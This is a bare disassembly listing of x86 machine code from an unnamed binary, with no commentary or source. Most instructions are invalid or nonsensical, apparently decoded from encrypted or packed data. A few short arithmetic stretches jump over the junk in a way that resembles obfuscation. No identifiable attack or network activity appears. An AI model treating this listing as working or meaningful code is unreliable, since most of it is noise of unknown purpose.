  408c1d:	lea    edi,[edx]
  408c1f:	xchg   edi,eax
  408c20:	bound  ebx,QWORD PTR [ecx+0x43dee39b]
  408c26:	aam    0x9b
  408c28:	jmp    0x268e:0xc7107108
  408c2f:	sbb    eax,0x406bd567
  408c34:	sbb    edx,DWORD PTR [esp+ebx*1-0x2a8afa2f]
  408c3b:	repnz sub al,0xa9
  408c3e:	rol    BYTE PTR [esi-0x2d],0xe1
  408c42:	icebp  
  408c43:	mov    dh,0x3d
  408c45:	(bad)  
  408c47:	sub    al,al
  408c49:	push   edi
  408c4a:	sub    eax,esi
  408c4c:	pop    ebx
  408c4d:	in     al,0xfe
  408c4f:	dec    eax
  408c50:	mov    bh,0xd7
  408c52:	call   0x2332:0x5341e547
  408c59:	inc    ebx
  408c5a:	outs   dx,BYTE PTR ds:[esi]
  408c5b:	inc    ebp
  408c5c:	push   ebp
  408c5d:	jl     0x408c39
  408c5f:	int    0x7c
  408c61:	mov    cl,0x37
  408c63:	xor    BYTE PTR [ecx-0x251f3b3e],bl
  408c69:	xchg   ebp,eax
  408c6a:	jb     0x408c9a
  408c6c:	sub    DWORD PTR [esi+esi*8+0x27e918bc],ecx
  408c73:	sar    bl,1
  408c75:	mov    esi,edx
  408c77:	push   ss
  408c78:	ret    
  408c79:	cmc    
  408c7a:	xor    al,0xa3
  408c7c:	xor    dh,BYTE PTR [esi-0x3867a282]
  408c82:	sbb    edx,DWORD PTR [ebx-0x25]
  408c85:	cmp    al,0x1a
  408c87:	call   0xb240b2a8
  408c8c:	(bad)  
  408c8d:	jle    0x408c51
  408c8f:	and    eax,0xd8d8f566
  408c94:	sbb    BYTE PTR [edx*2+0x58b5f551],0x1d
  408c9c:	iret   
  408c9d:	jnp    0x408cd0
  408c9f:	mov    esp,0x30c15ce9
  408ca4:	lds    edi,FWORD PTR [ecx]
  408ca6:	dec    edi
  408ca7:	aaa    
  408ca8:	sub    eax,DWORD PTR [ebx+0x6847c2d3]
  408cae:	shr    DWORD PTR [edx+0x24],cl
  408cb1:	jg     0x408c8d
  408cb3:	fisubr DWORD PTR [eax]
  408cb5:	rcl    DWORD PTR [ebp-0x2ebbee19],cl
  408cbb:	loope  0x408cb9
  408cbd:	mov    ch,0xdb
  408cbf:	pop    ss
  408cc0:	mov    esi,0x8c32e8d4
  408cc5:	loopne 0x408c86
  408cc7:	gs ds dec esi
  408cca:	inc    edi
  408ccb:	xor    DWORD PTR [ebx],ebp
  408ccd:	push   0x4e
  408ccf:	popa   
  408cd0:	add    al,0xae
  408cd2:	sub    DWORD PTR [ebp+0x53],edx
  408cd5:	or     eax,0x37c8748f
  408cda:	pop    ebx
  408cdb:	stos   BYTE PTR es:[edi],al
  408cdc:	fidiv  DWORD PTR [ebp+0x3e]
  408cdf:	adc    eax,0xe1540fe1
  408ce4:	mov    bh,0x71
  408ce6:	cmp    bl,BYTE PTR [ecx-0xa]
  408ce9:	or     eax,0x1656d9b0
  408cee:	fldcw  WORD PTR [ebx-0x3e8041c7]
  408cf4:	cmp    ch,BYTE PTR [ecx]
  408cf6:	mov    ebx,0x1b6ee976
  408cfb:	(bad)  
  408cfc:	add    eax,DWORD PTR [ebx+0xb]
  408cff:	jge    0x408ce8
  408d01:	je     0x408ca1
  408d03:	fsubr  QWORD PTR ds:0x1ddf98b9
  408d09:	stc    
  408d0a:	in     eax,0x39
  408d0c:	or     bl,BYTE PTR [eax+0x608b20c8]
  408d12:	dec    ebx
  408d13:	mov    dh,BYTE PTR [edx]
  408d15:	and    cl,BYTE PTR [eax-0x7f]
  408d18:	xor    ch,BYTE PTR [edi]
  408d1a:	xchg   BYTE PTR [ebx+0x5f],al
  408d1d:	xor    eax,DWORD PTR [ebx+eax*1+0x60]
  408d21:	sbb    ebp,ebx
  408d23:	in     al,0x7d
  408d25:	push   ss
  408d26:	in     al,0xab
  408d28:	cs cli 
  408d2a:	cmp    BYTE PTR [edx],ah
  408d2c:	or     bl,cl
  408d2e:	adc    al,0xba
  408d30:	loop   0x408d21
  408d32:	jbe    0x408da2
  408d34:	and    al,0x38
  408d36:	push   es
  408d37:	xchg   edi,eax
  408d38:	fisubr WORD PTR [eax-0x15]
  408d3b:	fdivr  st,st(2)
  408d3d:	xchg   al,ah
  408d3f:	hlt    
  408d40:	push   ss
  408d41:	xor    BYTE PTR [ebx],al
  408d43:	aaa    
  408d44:	jle    0x408d4c
  408d46:	add    al,0xbf
  408d48:	mov    ah,BYTE PTR [ecx]
  408d4a:	push   0x49
  408d4c:	mov    bl,dh
  408d4e:	cmp    al,0x29
  408d50:	sbb    edi,eax
  408d52:	lahf   
  408d53:	jbe    0x408cf1
  408d55:	sti    
  408d56:	inc    edi
  408d57:	imul   esi,DWORD PTR [edi-0x46aa172c],0x4e
  408d5e:	pop    es
  408d5f:	push   ecx
  408d60:	fidiv  DWORD PTR [edi-0x2a14e424]
  408d66:	xor    al,0xa9
  408d68:	iret   
  408d69:	mov    ds:0x6ad33618,eax
  408d6e:	xor    dh,BYTE PTR [ecx-0x18]
  408d71:	and    ebx,DWORD PTR [ecx+eax*8-0x5e]
  408d75:	jnp    0x408d97
  408d77:	cdq    
  408d78:	bound  edi,QWORD PTR [esi]
  408d7a:	sar    BYTE PTR [ebx-0x25fb50ef],cl
  408d80:	pop    ds
  408d81:	loopne 0x408d94
  408d83:	sbb    eax,DWORD PTR [edx+0x2e]
  408d86:	das    
  408d87:	je     0x408d5c
  408d89:	add    BYTE PTR [edi+edx*1+0x73],cl
  408d8d:	iret   
  408d8e:	xchg   ebp,eax
  408d8f:	pop    eax
  408d90:	outs   dx,BYTE PTR ds:[esi]
  408d91:	sar    BYTE PTR [esp+ebx*2],0x26
  408d95:	data16 sub al,0x52
  408d98:	xor    DWORD PTR [eax],ebx
  408d9a:	gs dec ecx
  408d9c:	repnz mov edx,0x37b85ee9
  408da2:	jno    0x408de5
  408da4:	test   eax,0x1aa1b9a
  408da9:	(bad)  
  408daa:	inc    eax
  408dab:	test   eax,0x72021c66
  408db0:	lahf   
  408db1:	arpl   WORD PTR ds:0x2f31e45e,cx
  408db7:	pop    edi
  408db8:	lea    eax,[ebx+0x1f]
  408dbb:	mov    ds:0xb1cd796b,al
  408dc0:	test   eax,0x615353cc
  408dc5:	xchg   BYTE PTR [ebp-0x25],dl
  408dc8:	jle    0x408d65
  408dca:	xchg   ebx,eax
  408dcb:	aam    0xc3
  408dcd:	call   0xdc86:0x26e42205
  408dd4:	cdq    
  408dd5:	mov    ebp,0x19c4a5ae
  408dda:	call   FWORD PTR [edi+eiz*4+0x30]
  408dde:	(bad)  
  408de0:	cmp    edx,esi
  408de2:	xchg   ebp,eax
  408de3:	adc    ch,ah
  408de5:	loop   0x408dc8
  408de7:	out    0x1,al
  408de9:	sbb    cl,BYTE PTR [edx]
  408deb:	xchg   ebx,eax
  408dec:	push   esi
  408ded:	mov    esp,0x30f4034
  408df2:	sahf   
  408df3:	xor    dh,dl
  408df5:	xor    bl,BYTE PTR [eax]
  408df7:	push   0x21
  408df9:	pop    edx
  408dfa:	lahf   
  408dfb:	es test al,0x1c
  408dfe:	in     al,dx
  408dff:	and    al,0x8d
  408e01:	fsub   st,st(3)
  408e03:	outs   dx,DWORD PTR ds:[esi]
  408e04:	popf   
  408e05:	sti    
  408e06:	sub    eax,0xe1bfb1f6
  408e0b:	pop    es
  408e0c:	mov    al,0xc5
  408e0e:	popf   
  408e0f:	(bad)  
  408e10:	jmp    0x8f7e461b
  408e15:	xor    eax,0x9d8d3546
  408e1a:	hlt    
  408e1b:	and    DWORD PTR [eax],esi
  408e1d:	aas    
  408e1e:	(bad)  
  408e1f:	nop    DWORD PTR [ebx]
  408e22:	ja     0x408e01
  408e24:	in     al,dx
  408e25:	into   
  408e26:	loope  0x408e84
  408e28:	mov    ebp,DWORD PTR [eax+0x32]
  408e2b:	popa   
  408e2c:	(bad)  
  408e2d:	fs loopne 0x408e7f
  408e30:	or     BYTE PTR [ecx],bh
  408e32:	cmp    BYTE PTR [eax+ecx*8+0x7b20cf8],bh
  408e39:	and    BYTE PTR [ebx-0x1232ae96],0x35
  408e40:	mov    DWORD PTR [edi],ecx
  408e42:	lods   al,BYTE PTR ds:[esi]
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	loopne 0x408e92
  408e77:	iret   
  408e78:	jo     0x408eb4
  408e7a:	push   ecx
  408e7b:	sbb    BYTE PTR [eax],bl
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    BYTE PTR [esi+0x59],bl
  408e83:	repz xor ch,dl
  408e86:	sar    cl,0xb4
  408e89:	jp     0x408eed
  408e8b:	dec    edx
  408e8c:	add    dh,BYTE PTR [ebp+0x16]
  408e8f:	dec    edi
  408e90:	xor    DWORD PTR [ecx],edi
  408e92:	sbb    BYTE PTR [edi-0x62],cl
  408e95:	out    dx,eax
  408e96:	das    
  408e97:	push   0x72
  408e99:	cmc    
  408e9a:	push   ebx
  408e9b:	jb     0x408e50
  408e9d:	xor    eax,0x4641a1ca
  408ea2:	mov    ds:0x4e097313,al
  408ea7:	enter  0xae3b,0xd
  408eab:	jg     0x408efc
  408ead:	fld    DWORD PTR [esi+0x1e]
  408eb0:	xor    DWORD PTR [eax-0x7a80d72b],ebx
  408eb6:	hlt    
  408eb7:	and    cl,bh
  408eb9:	push   ss
  408eba:	(bad)  
  408ebc:	sbb    ecx,DWORD PTR cs:[edx+0x63]
  408ec0:	stos   BYTE PTR es:[edi],al
  408ec1:	dec    ecx
  408ec2:	stos   BYTE PTR es:[edi],al
  408ec3:	push   edi
  408ec4:	inc    ebx
  408ec5:	inc    edi
  408ec6:	jno    0x408e6c
  408ec8:	adc    bh,BYTE PTR [edi-0x19a37d4d]
  408ece:	pop    edi
  408ecf:	dec    ebp
  408ed0:	jbe    0x408e6a
  408ed2:	pop    eax
  408ed3:	popf   
  408ed4:	push   ss
  408ed5:	cmc    
  408ed6:	stos   BYTE PTR es:[edi],al
  408ed7:	mov    edx,eax
  408ed9:	dec    esi
  408eda:	nop
  408edb:	es or  al,0x5
  408ede:	mov    esi,0x69952854
  408ee3:	cmp    BYTE PTR [edx-0x31],0x32
  408ee7:	mov    bl,BYTE PTR [ebx-0x57336456]
  408eed:	and    DWORD PTR [ebx],esp
  408eef:	dec    ebx
  408ef0:	sbb    BYTE PTR [edx+0x17c71336],0xeb
  408ef7:	int    0x86
  408ef9:	cwde   
  408efa:	outs   dx,DWORD PTR ds:[esi]
  408efb:	sub    DWORD PTR [eax],ecx
  408efd:	and    ch,0x9a
  408f00:	jge    0x408f4f
  408f02:	popf   
  408f03:	pop    ecx
  408f04:	mov    ch,0x31
  408f06:	inc    ebx
  408f07:	imul   edx,esi,0x8
  408f0a:	sub    DWORD PTR [esi-0x4e],ebx
  408f0d:	dec    esp
  408f0e:	xor    esi,0x6bfc84cb
  408f14:	mov    al,ds:0x18e3e435
  408f19:	adc    ebp,0x25
  408f1c:	cmp    eax,0x93e26576
  408f21:	mov    ?,ebx
  408f23:	adc    edx,0x53
  408f26:	and    esi,ebp
  408f28:	jno    0x408eb0
  408f2a:	cmp    bh,al
  408f2c:	mov    dh,0x40
  408f2e:	push   0xfdeb17a7
  408f33:	clc    
  408f34:	xchg   ebx,eax
  408f35:	loope  0x408f9d
  408f37:	out    dx,al
  408f38:	out    0xc8,al
  408f3a:	jmp    0x408f41
  408f3c:	add    eax,0x119bd299
  408f41:	sbb    al,0x2c
  408f43:	mov    ch,0xfb
  408f45:	xchg   ebp,eax
  408f46:	add    BYTE PTR [eax-0x8da85c],0x95
  408f4d:	std    
  408f4e:	inc    edi
  408f4f:	in     al,0xfd
  408f51:	xchg   esp,eax
  408f52:	aad    0xc4
  408f54:	adc    ecx,DWORD PTR [ebx-0x61996bd4]
  408f5a:	sub    al,0x13
  408f5c:	fidivr WORD PTR [edi]
  408f5e:	in     al,0x13
  408f60:	adc    eax,0xfc44f2e3
  408f65:	xchg   BYTE PTR [edx],bh
  408f67:	adc    eax,0x64190a50
  408f6c:	fxch   st(1)
  408f6e:	and    eax,DWORD PTR [edx]
  408f70:	cwde   
  408f71:	jb     0x408f7d
  408f73:	xchg   esi,eax
  408f74:	std    
  408f75:	cmc    
  408f76:	add    dh,ah
  408f78:	aad    0x2c
  408f7a:	js     0x408f0d
  408f7c:	xchg   DWORD PTR [bp+si+0x76],ebx
  408f80:	gs xor eax,0x21740049
  408f86:	push   edi
  408f87:	out    0xe0,al
  408f89:	inc    eax
  408f8a:	fisub  DWORD PTR [ebp+0x657c22d0]
  408f90:	inc    esp
  408f91:	pop    edi
  408f92:	jle    0x409007
  408f94:	out    0x35,eax
  408f96:	pop    esp
  408f97:	aaa    
  408f98:	adc    DWORD PTR [esi+edi*8],ebp
  408f9b:	mov    edi,0x9a89a9dd
  408fa0:	imul   esi,eax,0xb48807d6
  408fa6:	pop    ss
  408fa7:	push   ds
  408fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fa9:	clc    
  408faa:	fist   WORD PTR [esi+0x5d]
  408fad:	lods   al,BYTE PTR ds:[esi]
  408fae:	sbb    ebx,DWORD PTR [esi+0x5069d6aa]
  408fb4:	sub    BYTE PTR [edi+edi*8+0x22],bl
  408fb8:	pop    es
  408fb9:	jnp    0x408fb9
  408fbb:	jge    0x408f5b
  408fbd:	jmp    0x408fce
  408fbf:	aad    0x58
  408fc1:	jmp    0x5da5:0x369a6eea
  408fc8:	es mov ah,0x7e
  408fcb:	(bad)  
  408fcc:	and    al,0x49
  408fce:	inc    ebp
  408fcf:	mov    dh,0xf9
  408fd1:	bound  edi,QWORD PTR [edx+0x4c3e4996]
  408fd7:	mov    ds:0xfc0e83f9,al
  408fdc:	adc    al,0x4a
  408fde:	push   ebx
  408fdf:	sub    DWORD PTR [esp+edi*2],ebx
  408fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe3:	add    eax,DWORD PTR [ebx+0x7cc304f6]
  408fe9:	lods   al,BYTE PTR ds:[esi]
  408fea:	es (bad) 
  408fec:	xchg   esp,eax
  408fed:	scas   al,BYTE PTR es:[edi]
  408fee:	push   0x2c
  408ff0:	mov    cl,0x82
  408ff2:	or     DWORD PTR [esi+0x18],ecx
  408ff5:	fs in  eax,dx
  408ff7:	pusha  
  408ff8:	dec    ebp
  408ff9:	dec    ebx
  408ffa:	outs   dx,BYTE PTR ds:[esi]
  408ffb:	sbb    DWORD PTR [eax+0x59],esp
  408ffe:	xchg   edx,eax
  408fff:	push   ecx
  409000:	adc    edx,esp
  409002:	adc    dl,BYTE PTR [ebx+edx*1+0x4c19c973]
  409009:	push   esp
  40900a:	pop    esi
  40900b:	pop    edi
  40900c:	sti    
  40900d:	std    
  40900e:	fdivr  DWORD PTR [edi+esi*2]
  409011:	dec    edx
  409012:	nop
  409013:	(bad)  
  409014:	leave  
  409015:	fimul  WORD PTR [eax-0x6f]
  409018:	stos   DWORD PTR es:[edi],eax
  409019:	mov    esp,0xd4f7f709
  40901e:	cwde   
  40901f:	(bad)  
  409020:	idiv   bl
  409022:	or     eax,0xd2f97909
  409027:	dec    edx
  409028:	cmp    al,0x30
  40902a:	loop   0x409003
  40902c:	rcl    DWORD PTR [esp+edx*8+0x15ad578a],0xd2
  409034:	jp     0x408fca
  409036:	(bad)  [edi+ecx*2+0x1d437c82]
  40903d:	and    ecx,esi
  40903f:	mov    al,ds:0x2820b5ee
  409044:	or     cl,dh
  409046:	xor    ebp,esp
  409048:	loopne 0x40902d
  40904a:	ror    DWORD PTR [ecx+0xe529ce6],cl
  409050:	xor    ebp,ebx
  409052:	fs sub al,0xec
  409055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409056:	call   0x13f1:0x34f0c5d5
  40905d:	adc    bh,BYTE PTR [esi-0x32]
  409060:	mul    DWORD PTR [ebx+0x30]
  409063:	adc    eax,0x93b764da
  409068:	xor    bl,BYTE PTR [edx+0x6c26df66]
  40906e:	imul   ebx,DWORD PTR [ebx-0x626ee0b7],0xd
  409075:	pop    esi
  409076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409077:	inc    esi
  409078:	repnz int3 
  40907a:	push   edi
  40907b:	push   cs
  40907c:	mov    ds:0xd1334f98,eax
  409081:	retf   0xab36
  409084:	sbb    DWORD PTR [ebx+0x200f7dcb],edx
  40908a:	(bad)
  40908f:	outs   dx,DWORD PTR ds:[esi]
  409090:	cwde   
  409091:	or     ah,BYTE PTR [ebp+0x1f]
  409094:	test   al,0x57
  409096:	pop    edx
  409097:	loop   0x40905c
  409099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40909a:	pushf  
  40909b:	iret   
  40909c:	jne    0x4090fe
  40909e:	jle    0x40908c
  4090a0:	aas    
  4090a1:	mov    DWORD PTR [esi+0xcc7be32],ecx
  4090a7:	or     BYTE PTR [edx+0x3e],ch
  4090aa:	dec    ebp
  4090ab:	cmc    
  4090ac:	inc    eax
  4090ad:	jl     0x4090e4
  4090af:	pop    edi
  4090b0:	push   ebx
  4090b1:	clc    
  4090b2:	fidivr WORD PTR [ecx-0x4fb13779]
  4090b8:	sbb    bh,bl
  4090ba:	sub    esp,esi
  4090bc:	clc    
  4090bd:	sub    eax,0x7ce61a55
  4090c2:	fidiv  DWORD PTR [ebx]
  4090c4:	mov    bl,0x9e
  4090c6:	sar    DWORD PTR [ecx-0x46],cl
  4090c9:	aad    0xc
  4090cb:	push   ds
  4090cc:	jo     0x4090ec
  4090ce:	push   ebp
  4090cf:	pusha  
  4090d0:	push   ds
  4090d1:	pusha  
  4090d2:	rcl    ah,1
  4090d4:	or     al,BYTE PTR [esi]
  4090d6:	popa   
  4090d7:	sub    BYTE PTR [edi-0x5c7e6d3],dl
  4090dd:	rcl    DWORD PTR [ecx+0xbc2fe3],0xfe
  4090e4:	ffreep st(0)
  4090e6:	cmp    al,0x32
  4090e8:	aam    0x7d
  4090ea:	mov    cl,0x4f
  4090ec:	mov    eax,cs:0x21d48f3c
  4090f2:	js     0x409132
  4090f4:	(bad)  
  4090f5:	sar    DWORD PTR [ecx],cl
  4090f7:	or     eax,0xc6160ae7
  4090fc:	adc    cl,dl
  4090fe:	in     eax,dx
  4090ff:	inc    ebx
  409100:	ins    BYTE PTR es:[edi],dx
  409101:	in     al,0xa5
  409103:	pop    ecx
  409104:	xchg   ecx,eax
  409105:	(bad)  
  409106:	(bad)  [eax-0x42c62262]
  40910c:	dec    ebp
  40910d:	mov    dh,0x88
  40910f:	popa   
  409110:	jbe    0x4090b5
  409112:	add    BYTE PTR [esi],dl
  409114:	push   ecx
  409115:	or     DWORD PTR [edx+ecx*2],edx
  409118:	cmp    al,0xf8
  40911a:	xor    ecx,DWORD PTR [edx]
  40911c:	adc    ebp,DWORD PTR [edx+0x350242af]
  409122:	(bad)  [eax+0x56]
  409125:	jge    0x409112
  409127:	mov    ebx,0x9098f58
  40912c:	jg     0x409184
  40912e:	jne    0x409110
  409130:	mov    dh,0xfe
  409132:	adc    ecx,ebx
  409134:	call   0x2f0a0f07
  409139:	dec    esp
  40913a:	jno    0x40918e
  40913c:	dec    edi
  40913d:	pop    eax
  40913e:	dec    esp
  40913f:	xchg   edx,eax
  409140:	adc    dh,0x64
  409143:	loop   0x4090f4
  409145:	mov    bh,0x85
  409147:	push   edx
  409148:	jecxz  0x4091be
  40914a:	aad    0x4e
  40914c:	xchg   esp,eax
  40914d:	dec    ebp
  40914e:	pushf  
  40914f:	pop    esp
  409150:	imul   esi,DWORD PTR [ecx],0x18
  409153:	jge    0x40915f
  409155:	loopne 0x40911f
  409157:	cmp    al,0xdb
  409159:	hlt    
  40915a:	dec    ebx
  40915b:	cmp    eax,0x3947fdd
  409160:	ds hlt 
  409162:	add    al,BYTE PTR [edi-0x2b]
  409165:	retf   
  409166:	cli    
  409167:	lea    esp,[ecx-0x3b]
  40916a:	push   eax
  40916b:	pop    ebx
  40916c:	inc    ebx
  40916d:	mov    gs,WORD PTR [ebp+0x764adec4]
  409173:	xchg   DWORD PTR [ebp-0x60],ebp
  409176:	sbb    eax,0xce4e85ef
  40917b:	mov    dh,BYTE PTR [ebp+0x2d96c36a]
  409181:	mov    DWORD PTR [edi+ecx*2-0x46],ebx
  409185:	jno    0x4091f1
  409187:	int    0x7c
  409189:	sbb    dh,BYTE PTR [ebp+0x7]
  40918c:	jp     0x40918b
  40918e:	in     al,0x3c
  409190:	lock push ss
  409192:	adc    al,0x28
  409194:	pop    ds
  409195:	sub    esp,DWORD PTR [eax+0x74]
  409198:	xor    al,0x47
  40919a:	xchg   ebp,eax
  40919b:	shr    BYTE PTR [edi-0x59],0x62
  40919f:	or     dl,BYTE PTR [ebx]
  4091a1:	scas   al,BYTE PTR es:[edi]
  4091a2:	xchg   ecx,eax
  4091a3:	pop    ebx
  4091a4:	and    al,0x3d
  4091a6:	pop    ebp
  4091a7:	jne    0x40918b
  4091a9:	inc    edx
  4091aa:	and    BYTE PTR [ebp+0x24],bl
  4091ad:	icebp  
  4091ae:	mov    ebx,0x44ee8c14
  4091b3:	out    0x5d,al
  4091b5:	dec    ebx
  4091b6:	cmp    BYTE PTR [eax+0x3116143e],dh
  4091bc:	or     al,BYTE PTR [edi]
  4091be:	jno    0x40918c
  4091c0:	and    eax,DWORD PTR [eax-0x34]
  4091c3:	out    dx,al
  4091c4:	repnz pop ebx
  4091c6:	or     edi,ebp
  4091c8:	xchg   BYTE PTR [ebp-0x21624b79],al
  4091ce:	mov    ebx,0x686f4fba
  4091d3:	dec    ebp
  4091d4:	xor    BYTE PTR [esi-0x4d576488],dh
  4091da:	leave  
  4091db:	lods   eax,DWORD PTR ds:[esi]
  4091dc:	or     eax,0xb7cd9cbe
  4091e1:	mov    fs,WORD PTR [eax-0x31]
  4091e4:	cmp    esp,DWORD PTR [edi-0x2a]
  4091e7:	adc    eax,0xd0dc5a20
  4091ec:	push   ss
  4091ed:	add    bh,BYTE PTR [edi]
  4091ef:	mov    bh,0x75
  4091f1:	test   eax,0xb88ed4dc
  4091f6:	push   ebp
  4091f7:	lods   al,BYTE PTR ds:[esi]
  4091f8:	sbb    ecx,DWORD PTR [ebx]
  4091fa:	cmp    cl,BYTE PTR [esp+ebx*4-0x6d]
  4091fe:	dec    edi
  4091ff:	fcom   DWORD PTR [ebp+0x14]
  409202:	mov    bh,0x1b
  409204:	sahf   
  409205:	and    eax,0xf0ce641c
  40920a:	jmp    0x9cded6c0
  40920f:	pop    eax
  409210:	shr    DWORD PTR [ecx-0x1ebc2d56],cl
  409216:	push   ebx
  409217:	rcl    BYTE PTR [ebp+eiz*8-0x52e9df29],1
  40921e:	push   ss
  40921f:	daa    
  409220:	cmp    BYTE PTR [esi],dh
  409222:	popf   
  409223:	ja     0x4091ab
  409225:	iret   
  409226:	je     0x40926a
  409228:	je     0x40926e
  40922a:	push   eax
  40922b:	push   ss
  40922c:	inc    edx
  40922d:	hlt    
  40922e:	mov    ds:0x6180352f,eax
  409233:	(bad)  
  409234:	dec    ebx
  409235:	sub    eax,0xa443a31c
  40923a:	jnp    0x40926b
  40923c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40923d:	mov    esi,0x2ce46b08
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0x37fc0670
  409261:	push   0xffffffc0
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [edi],al
  40926b:	int3   
  40926c:	xchg   esp,eax
  40926d:	es test al,0x5e
  409270:	gs lds edi,FWORD PTR cs:[ebx-0x59]
  409275:	adc    cl,BYTE PTR [ebp+edi*8-0x2671114c]
  40927c:	jg     0x409289
  40927e:	dec    ecx
  40927f:	push   eax
  409280:	lods   al,BYTE PTR ds:[esi]
  409281:	not    DWORD PTR [esi]
  409283:	mov    ?,WORD PTR [eax+0x63]
  409286:	pop    ecx
  409287:	test   al,0x20
  409289:	enter  0x4c68,0x46
  40928d:	mov    esi,0xb67f3292
  409292:	cs enter 0xd1b1,0xa1
  409297:	lods   eax,DWORD PTR ds:[esi]
  409298:	mov    dl,0x6f
  40929a:	(bad)  
  40929b:	dec    ecx
  40929c:	mov    bh,0x22
  40929e:	sub    DWORD PTR [ebp-0x57cef802],ebx
  4092a4:	xchg   esp,eax
  4092a5:	fidiv  DWORD PTR ds:0x9a2d099c
  4092ab:	test   al,0x2c
  4092ad:	mov    ebx,0x50131027
  4092b2:	pop    esi
  4092b3:	push   0xffffffe9
  4092b5:	sar    DWORD PTR [esi+edi*4],0xfb
  4092b9:	sub    ch,BYTE PTR [edi+0x6c]
  4092bc:	add    edx,eax
  4092be:	cld    
  4092bf:	int    0xe
  4092c1:	mov    ah,0xfb
  4092c3:	lock cmp DWORD PTR cs:[esi+0x7d21443f],eax
  4092cb:	push   ss
  4092cc:	pop    es
  4092cd:	or     DWORD PTR [eax],0x32
  4092d0:	test   al,0x98
  4092d2:	je     0x4092ba
  4092d4:	mov    ebp,0x17ea3083
  4092d9:	inc    edi
  4092da:	pusha  
  4092db:	pop    ebx
  4092dc:	lea    esi,[ecx-0x74]
  4092df:	or     al,0xc
  4092e1:	hlt    
  4092e2:	ret    0xd32b
  4092e5:	xchg   ebp,eax
  4092e6:	mov    eax,ds:0xaa394639
  4092eb:	inc    ebp
  4092ec:	pop    ecx
  4092ed:	int    0xa1
  4092ef:	sbb    al,0xa8
  4092f1:	mov    ah,0x1a
  4092f3:	imul   edi,DWORD PTR [esp+edx*8+0x5e],0x56
  4092f8:	outs   dx,DWORD PTR ds:[esi]
  4092f9:	hlt    
  4092fa:	es inc eax
  4092fc:	push   edi
  4092fd:	mov    ah,0x2a
  4092ff:	inc    esp
  409300:	repz inc eax
  409302:	push   DWORD PTR [edi+ebx*4+0x3540887e]
  409309:	adc    al,0xa7
  40930b:	mov    ebp,0xbbc93058
  409310:	jp     0x409366
  409312:	das    
  409313:	mov    ds:0xe51ffe92,eax
  409318:	shl    BYTE PTR [esi],cl
  40931a:	dec    esp
  40931b:	pop    eax
  40931c:	xor    al,BYTE PTR [esi]
  40931e:	in     al,dx
  40931f:	sbb    bl,ch
  409321:	pushf  
  409322:	inc    edx
  409323:	cs pop es
  409325:	xor    cl,al
  409327:	xlat   BYTE PTR ds:[ebx]
  409328:	sbb    al,0xc1
  40932a:	or     DWORD PTR [ecx-0x1143f750],ecx
  409330:	xor    ebx,DWORD PTR [eax]
  409332:	xor    ebx,DWORD PTR [ebp-0x7ec48524]
  409338:	cli    
  409339:	cmc    
  40933a:	pusha  
  40933b:	popa   
  40933c:	inc    ecx
  40933d:	and    esp,DWORD PTR [ecx]
  40933f:	sbb    BYTE PTR [eax+eax*2-0x2c911edd],dl
  409346:	out    dx,al
  409347:	out    dx,al
  409348:	int3   
  409349:	dec    ebx
  40934a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40934b:	jns    0x4092d2
  40934d:	sub    al,0x8
  40934f:	fsubr  QWORD PTR [ebx]
  409351:	mov    BYTE PTR [ecx+0x6cb97047],bh
  409357:	inc    ebx
  409358:	aas    
  409359:	dec    esi
  40935a:	out    dx,eax
  40935b:	cmp    al,dh
  40935d:	inc    esp
  40935e:	xor    esi,DWORD PTR [ecx]
  409360:	ficomp DWORD PTR [esi+0x70]
  409363:	push   0x4423e6f4
  409368:	ror    DWORD PTR [ecx],cl
  40936a:	adc    ah,BYTE PTR [ebp-0x47202934]
  409370:	push   ecx
  409371:	adc    eax,0x66d7c0b7
  409376:	push   cs
  409377:	neg    bh
  409379:	(bad)  
  40937a:	sbb    BYTE PTR [edx+0xd6666c0],cl
  409380:	jbe    0x409329
  409382:	inc    ebp
  409383:	int3   
  409384:	jge    0x40938c
  409386:	mov    ds,WORD PTR [edx-0x6a35a5fa]
  40938c:	(bad)  
  40938d:	mov    dh,0xca
  40938f:	sub    cl,BYTE PTR [ebx]
  409391:	das    
  409392:	push   0x376a1505
  409397:	retf   
  409398:	(bad)  
  409399:	cmp    eax,0xc463f0e0
  40939e:	fld    QWORD PTR [edx-0x4cf465db]
  4093a4:	std    
  4093a5:	mov    al,0x1f
  4093a7:	repnz das 
  4093a9:	or     BYTE PTR [ebx+0x2a],ah
  4093ac:	call   0x5d63:0x1fa2cea7
  4093b3:	sub    al,0x8
  4093b5:	mov    ebp,0x43900775
  4093ba:	enter  0xdcdb,0xa6
  4093be:	(bad)  
  4093bf:	mov    edi,0xfb822ba6
  4093c4:	ds cmp eax,0xf66a6883
  4093ca:	mov    bl,0x5c
  4093cc:	in     al,0x12
  4093ce:	mov    ds:0x2c280cc,eax
  4093d3:	sub    DWORD PTR [ecx],esi
  4093d5:	adc    eax,0x8d39e358
  4093da:	jmp    0x3c7637ac
